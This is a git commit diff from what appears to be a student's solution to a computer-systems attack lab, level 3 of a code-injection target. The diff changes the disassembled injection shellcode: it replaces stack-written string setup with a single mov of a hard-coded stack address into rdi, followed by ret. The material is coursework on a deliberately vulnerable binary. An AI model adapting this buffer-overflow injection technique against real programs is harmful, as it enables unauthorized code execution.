aea8b234d83cfc368b83c9adcef51bbfede8fadc
niazye <niazye@outlook.com>
2025-05-29 00:42:52 +0800

    some pdf

--- lab/lab3/target1/Solution_files/ctarget_lv3/injection_asm.asm
+++ lab/lab3/target1/Solution_files/ctarget_lv3/injection_asm.asm
@@ -5,9 +5,5 @@ injection_asm.o:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000000000 <.text>:
-   0:	48 c7 44 24 20 35 39 	movq   $0x39623935,0x20(%rsp)
-   7:	62 39 
-   9:	48 c7 44 24 24 39 37 	movq   $0x61663739,0x24(%rsp)
-  10:	66 61 
-  12:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
-  17:	c3                   	ret
+   0:   48 c7 c7 b0 dc 61 55    mov    $0x5561dcb0,%rdi
+   7:   c3                      ret
